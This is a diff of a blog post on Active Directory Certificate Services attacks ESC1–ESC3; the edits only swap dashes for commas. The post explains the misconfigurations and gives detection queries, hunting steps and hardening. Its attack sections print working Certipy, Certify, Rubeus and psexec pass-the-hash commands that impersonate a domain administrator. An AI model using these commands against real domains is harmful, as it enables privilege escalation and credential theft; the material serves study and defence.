@@ -1,6 +1,6 @@
 ---
 title: "ADCS Certificate Attacks: ESC1, ESC2, ESC3"
-description: "Deep dive into Active Directory Certificate Services attacks: how PKI and certificates work in AD, ESC1/ESC2/ESC3 attack mechanics, detection, hunting, and hardening — from a Microsoft infrastructure expert perspective."
+description: "Deep dive into Active Directory Certificate Services attacks: how PKI and certificates work in AD, ESC1/ESC2/ESC3 attack mechanics, detection, hunting, and hardening, from a Microsoft infrastructure expert perspective."
 date: 2026-06-12T10:45:00
 category: active-directory
 tags:
@@ -21,9 +21,9 @@ featured: false
 
 ## Introduction
 
-Active Directory Certificate Services (ADCS) is Microsoft's on-premises Public Key Infrastructure (PKI) solution. Deployed in the majority of enterprise Windows environments, it issues certificates used for authentication, encryption, code signing, and more. In 2021, SpecterOps researchers Will Schroeder and Lee Christensen published *"Certified Pre-Owned"* — a research paper that catalogued over a dozen ADCS misconfigurations that allow domain privilege escalation, lateral movement, and persistence.
+Active Directory Certificate Services (ADCS) is Microsoft's on-premises Public Key Infrastructure (PKI) solution. Deployed in the majority of enterprise Windows environments, it issues certificates used for authentication, encryption, code signing, and more. In 2021, SpecterOps researchers Will Schroeder and Lee Christensen published *"Certified Pre-Owned"*, a research paper that catalogued over a dozen ADCS misconfigurations that allow domain privilege escalation, lateral movement, and persistence.
 
-This post covers ESC1, ESC2, and ESC3 — the three most commonly encountered and exploited misconfigurations. Before explaining the attacks, we need to understand how ADCS works.
+This post covers ESC1, ESC2, and ESC3, the three most commonly encountered and exploited misconfigurations. Before explaining the attacks, we need to understand how ADCS works.
 
 ---
 
@@ -67,13 +67,13 @@ This is the core mechanism exploited by ADCS attacks. A certificate with the **C
 3. KDC looks up the account the certificate maps to (via UPN or SAN in the certificate)
 4. KDC issues a TGT for that account
 
-**The critical insight**: if an attacker can obtain a certificate that maps to a privileged account (like Domain Admin), they can use it to get a TGT for that account — indefinitely, until the certificate expires.
+**The critical insight**: if an attacker can obtain a certificate that maps to a privileged account (like Domain Admin), they can use it to get a TGT for that account, indefinitely, until the certificate expires.
 
 A certificate is valid for 1-10 years by default. **Even if the account's password is reset, the certificate remains valid.** This makes certificate-based persistence the most durable form of persistence in AD.
 
 ### The NTLM Hash via Certificates (PKINIT → NT Hash)
 
-When you authenticate via PKINIT, the KDC embeds an NT hash in the encrypted TGT (for backward compatibility). You can extract this NT hash from the TGT using Rubeus or Certipy, enabling Pass the Hash — without ever knowing the account's password.
+When you authenticate via PKINIT, the KDC embeds an NT hash in the encrypted TGT (for backward compatibility). You can extract this NT hash from the TGT using Rubeus or Certipy, enabling Pass the Hash, without ever knowing the account's password.
 
 ```bash
 # Certipy: authenticate with certificate → get TGT + NT hash
@@ -85,12 +85,12 @@ This is why ADCS attacks are so powerful: they provide both long-term certificat
 
 ---
 
-## Enumeration — The Starting Point for All ESC Attacks
+## Enumeration, The Starting Point for All ESC Attacks
 
 Before exploiting any ESC, an attacker enumerates the ADCS environment:
 
 ```bash
-# Certipy (Python, Linux) — enumerate all CAs and templates
+# Certipy (Python, Linux), enumerate all CAs and templates
 certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10
 
 # Output: certipy.json and certipy.txt with all CAs, templates, and misconfigurations flagged
@@ -98,7 +98,7 @@ certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulner
 ```
 
 ```powershell
-# Certify (C#, Windows) — enumerate vulnerable templates
+# Certify (C#, Windows), enumerate vulnerable templates
 .\Certify.exe find /vulnerable
 
 # Enumerate all templates
@@ -109,7 +109,7 @@ certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulner
 ```
 
 ```powershell
-# Native PowerShell — enumerate certificate templates from AD
+# Native PowerShell, enumerate certificate templates from AD
 Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(Get-ADDomain | Select-Object -ExpandProperty DistinguishedName)" `
   -Filter { objectClass -eq 'pKICertificateTemplate' } `
   -Properties * |
@@ -120,7 +120,7 @@ Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Ser
 
 ---
 
-## ESC1 — Misconfigured Certificate Templates (Requester-Supplied SAN)
+## ESC1, Misconfigured Certificate Templates (Requester-Supplied SAN)
 
 ### What ESC1 Is
 
@@ -130,7 +130,7 @@ ESC1 occurs when a certificate template:
 3. Has **enrollment permissions for low-privileged users** (Domain Users, Authenticated Users, etc.)
 4. Does **not require manager approval**
 
-The SAN (Subject Alternative Name) field of an X.509 certificate can contain a UPN (User Principal Name). When authenticating with PKINIT, the KDC looks up the account based on the UPN in the certificate's SAN. If you can specify an arbitrary SAN, you can request a certificate that maps to any account — including Domain Admin.
+The SAN (Subject Alternative Name) field of an X.509 certificate can contain a UPN (User Principal Name). When authenticating with PKINIT, the KDC looks up the account based on the UPN in the certificate's SAN. If you can specify an arbitrary SAN, you can request a certificate that maps to any account, including Domain Admin.
 
 ### Why This Flag Exists
 
@@ -160,7 +160,7 @@ certipy req \
 ```powershell
 # Same attack with Certify (Windows)
 .\Certify.exe request /ca:ca01.domain.local\domain-CA01-CA /template:VulnerableTemplate /altname:administrator
-# Output: PEM-encoded cert — convert to PFX with openssl
+# Output: PEM-encoded cert, convert to PFX with openssl
 ```
 
 ```bash
@@ -176,20 +176,20 @@ python3 psexec.py -hashes :NTHASH administrator@dc01.domain.local
 ```
 
 ```powershell
-# Rubeus — use the PFX directly
+# Rubeus, use the PFX directly
 .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:certipy /ptt
 ```
 
-### ESC1 — Security Impact
+### ESC1, Security Impact
 
-- **Any domain user** can impersonate any AD account — including Domain Admins
+- **Any domain user** can impersonate any AD account, including Domain Admins
 - The resulting certificate is valid for the template's lifetime (typically 1 year)
 - Password resets on the victim account do not invalidate the certificate
 - The attack generates very few events and leaves minimal traces
 
 ---
 
-## ESC2 — Misconfigured Certificate Templates (Any Purpose EKU)
+## ESC2, Misconfigured Certificate Templates (Any Purpose EKU)
 
 ### What ESC2 Is
 
@@ -198,7 +198,7 @@ ESC2 occurs when a certificate template:
 2. Has enrollment permissions for low-privileged users
 3. Does not require manager approval
 
-A certificate with "Any Purpose" EKU or no EKU can be used as a **Subordinate CA certificate** — meaning it can sign other certificates. If an attacker obtains such a certificate, they can issue their own certificates for any account.
+A certificate with "Any Purpose" EKU or no EKU can be used as a **Subordinate CA certificate**, meaning it can sign other certificates. If an attacker obtains such a certificate, they can issue their own certificates for any account.
 
 Certificates with no EKU effectively become mini-CAs trusted by the domain.
 
@@ -214,7 +214,7 @@ ESC2 provides a **reusable signing capability** rather than a single forged cert
 ```bash
 # Step 1: Enumerate
 certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
-# Look for: [ESC2] — template with Any Purpose or no EKU
+# Look for: [ESC2], template with Any Purpose or no EKU
 
 # Step 2: Request the "Any Purpose" or no-EKU certificate
 certipy req \
@@ -246,11 +246,11 @@ certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
 # Then use the CA cert to sign requests for other accounts via openssl or Certipy
 ```
 
-### ESC2 — Identifying the Vulnerable Condition
+### ESC2, Identifying the Vulnerable Condition
 
 The `pKIExtendedKeyUsage` attribute is either:
 - Contains OID `2.5.29.37.0` (Any Purpose)
-- Is empty / not present (SubCA — no EKU restriction)
+- Is empty / not present (SubCA, no EKU restriction)
 
 ```powershell
 # Find templates with Any Purpose EKU or no EKU
@@ -266,17 +266,17 @@ Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Ser
 
 ---
 
-## ESC3 — Enrollment Agent Certificate Abuse
+## ESC3, Enrollment Agent Certificate Abuse
 
 ### What ESC3 Is
 
 ESC3 involves two separate template misconfigurations that, when chained, allow an attacker to obtain a certificate for any user:
 
-**ESC3 Condition 1** — An enrollment agent template:
+**ESC3 Condition 1**, An enrollment agent template:
 - Has the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`)
 - Allows enrollment by low-privileged users without approval
 
-**ESC3 Condition 2** — A certificate template that:
+**ESC3 Condition 2**, A certificate template that:
 - Allows **enrollment agent enrollment** (the CA allows enrollment agents to request on behalf of others)
 - Has **Client Authentication** EKU
 - Allows enrollment without restriction on which enrollment agent can use it
@@ -302,7 +302,7 @@ Step 3: Attacker uses administrator.pfx to authenticate as administrator
 ### How an Attacker Exploits ESC3
 
 ```bash
-# Step 1: Enumerate — look for ESC3
+# Step 1: Enumerate, look for ESC3
 certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
 # [ESC3] in output means Condition 1 (enrollment agent template)
 # Look also for templates allowing enrollment agent enrollment (Condition 2)
@@ -344,9 +344,9 @@ certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
 
 ### Why ESC3 Is Particularly Dangerous
 
-- The enrollment agent mechanism is designed for **legitimate delegation** — it does not generate anomalous events by itself
-- Enrollment agent certificates are often issued to helpdesk accounts — an attacker compromising helpdesk gains this capability
-- The CA logs show certificate issuance for the legitimate enrollment agent, and then a second issuance "on behalf of" administrator — both look like routine smart card provisioning operations
+- The enrollment agent mechanism is designed for **legitimate delegation**, it does not generate anomalous events by itself
+- Enrollment agent certificates are often issued to helpdesk accounts, an attacker compromising helpdesk gains this capability
+- The CA logs show certificate issuance for the legitimate enrollment agent, and then a second issuance "on behalf of" administrator, both look like routine smart card provisioning operations
 
 ---
 
@@ -378,7 +378,7 @@ ADCS logs certificate events on the CA server itself (not the DCs):
 | 4890 | Microsoft-Windows-Security-Auditing | Certificate revoked |
 
 ```powershell
-# Run on the CA server — detect certificates issued with a SAN different from requester
+# Run on the CA server, detect certificates issued with a SAN different from requester
 Get-WinEvent -FilterHashtable @{
   LogName = 'Security'
   Id      = 4887   # certificate issued
@@ -435,7 +435,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = @(4886,4887) } `
 When a certificate is used for Kerberos authentication, Event 4768 on the DC shows `PreAuthType = 16` (PKINIT):
 
 ```powershell
-# Detect PKINIT logons — cross-reference with expected certificate-using accounts
+# Detect PKINIT logons, cross-reference with expected certificate-using accounts
 Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
   Where-Object { $_.Properties[8].Value -eq '16' } |   # PreAuthType 16 = PKINIT
   Select-Object TimeCreated,
@@ -463,7 +463,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
 Certipy and Certify make specific HTTP/RPC calls to the CA. Sysmon can detect the process behavior:
 
 ```powershell
-# Sysmon Event 1 — detect Certify or Certipy execution
+# Sysmon Event 1, detect Certify or Certipy execution
 Get-WinEvent -FilterHashtable @{
   LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
 } | Where-Object {
@@ -481,7 +481,7 @@ Get-WinEvent -FilterHashtable @{
 Create a certificate template that looks attractive (e.g., named "RemoteAccess" or "AdminCert") but is configured to alert on any request:
 
 ```powershell
-# Create a template that requires CA manager approval — any request triggers a pending
+# Create a template that requires CA manager approval, any request triggers a pending
 # notification that you can monitor without issuing the certificate
 
 # Via certsrv.msc:
@@ -500,16 +500,16 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4886 } `
     @{ n = 'Template';  e = { $_.Properties[11].Value } }
 ```
 
-Any request for this template is suspicious — legitimate users do not know it exists.
+Any request for this template is suspicious, legitimate users do not know it exists.
 
 ---
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Enumerate the current attack surface
+### Phase 1, Enumerate the current attack surface
 
 ```bash
-# Certipy — comprehensive enumeration with vulnerability flagging
+# Certipy, comprehensive enumeration with vulnerability flagging
 certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable
 # Review certipy_output.txt for [ESC1], [ESC2], [ESC3], [ESC4]-[ESC11]
 ```
@@ -526,7 +526,7 @@ Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Ser
   Select-Object Name, 'msPKI-Certificate-Name-Flag', pKIExtendedKeyUsage
 ```
 
-### Phase 2 — Review recently issued certificates
+### Phase 2, Review recently issued certificates
 
 ```powershell
 # Query the CA database for recently issued certificates
@@ -547,7 +547,7 @@ certutil -view -out "SubjectAltName,RequesterName,NotBefore,CertificateTemplate"
   Select-String "administrator|domainadmin" -Context 2
 ```
 
-### Phase 3 — Identify certificates issued with unusual SANs
+### Phase 3, Identify certificates issued with unusual SANs
 
 ```powershell
 # Review CA event log for all recent certificate issuance
@@ -569,10 +569,10 @@ Get-WinEvent -FilterHashtable @{
   }
 ```
 
-### Phase 4 — Revoke Compromised Certificates
+### Phase 4, Revoke Compromised Certificates
 
 ```powershell
-# On the CA server — revoke by serial number
+# On the CA server, revoke by serial number
 certutil -revoke <SerialNumber> 0  # 0 = unspecified reason
 # Reason codes: 0=unspecified, 1=key compromise, 2=CA compromise, 3=affiliation changed,
 # 4=superseded, 5=cessation of operation, 6=certificate hold
@@ -581,7 +581,7 @@ certutil -revoke <SerialNumber> 0  # 0 = unspecified reason
 certutil -crl
 
 # Force clients to refresh CRL (reboot or gpupdate alone does not immediately invalidate)
-# KDC checks CRL at ticket issuance — after CRL update, revoked cert becomes invalid for new TGTs
+# KDC checks CRL at ticket issuance, after CRL update, revoked cert becomes invalid for new TGTs
 ```
 
 > [!IMPORTANT]
@@ -591,7 +591,7 @@ certutil -crl
 
 ## How to Prevent It
 
-### 1. Audit All Certificate Templates — Remove ENROLLEE_SUPPLIES_SUBJECT from Auth Templates
+### 1. Audit All Certificate Templates, Remove ENROLLEE_SUPPLIES_SUBJECT from Auth Templates
 
 ```powershell
 # Find all templates with ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + no approval
@@ -623,7 +623,7 @@ certtmpl.msc → Template Properties → Issuance Requirements tab:
 ☑ CA certificate manager approval
 ```
 
-This prevents automated ESC1/2/3 exploitation — a human must approve each request.
+This prevents automated ESC1/2/3 exploitation, a human must approve each request.
 
 ### 3. Restrict Enrollment Permissions
 
@@ -658,7 +658,7 @@ Specify which enrollment agents can enroll on behalf of which templates and user
 
 ### 6. Enable LDAP-based Certificate Mapping (Strong Mapping)
 
-Microsoft released a security update (KB5014754) that enables strict certificate-to-account mapping — requiring the certificate to include the account's SID in a specific extension. This prevents certificates issued before the patch from being used for authentication.
+Microsoft released a security update (KB5014754) that enables strict certificate-to-account mapping, requiring the certificate to include the account's SID in a specific extension. This prevents certificates issued before the patch from being used for authentication.
 
 ```powershell
 # Check KB5014754 strong certificate mapping mode
@@ -701,4 +701,4 @@ Invoke-Command -ComputerName ca01.domain.local -ScriptBlock {
 
 ## Conclusion
 
-ADCS attacks are among the most impactful and underdetected attack classes in modern Active Directory environments. A low-privilege domain user can escalate to Domain Admin in minutes if a single vulnerable template exists. The detection surface is narrow (CA event logs, PKINIT events on DCs) and rarely monitored. Remediation requires both fixing the templates (removing ENROLLEE_SUPPLIES_SUBJECT, enforcing approval, restricting EKUs) and revoking any certificates already issued through the misconfiguration. Certipy is the most efficient tool for both offensive enumeration and defensive auditing — run it against your environment and treat every [ESC] finding as a critical finding.
+ADCS attacks are among the most impactful and underdetected attack classes in modern Active Directory environments. A low-privilege domain user can escalate to Domain Admin in minutes if a single vulnerable template exists. The detection surface is narrow (CA event logs, PKINIT events on DCs) and rarely monitored. Remediation requires both fixing the templates (removing ENROLLEE_SUPPLIES_SUBJECT, enforcing approval, restricting EKUs) and revoking any certificates already issued through the misconfiguration. Certipy is the most efficient tool for both offensive enumeration and defensive auditing, run it against your environment and treat every [ESC] finding as a critical finding.
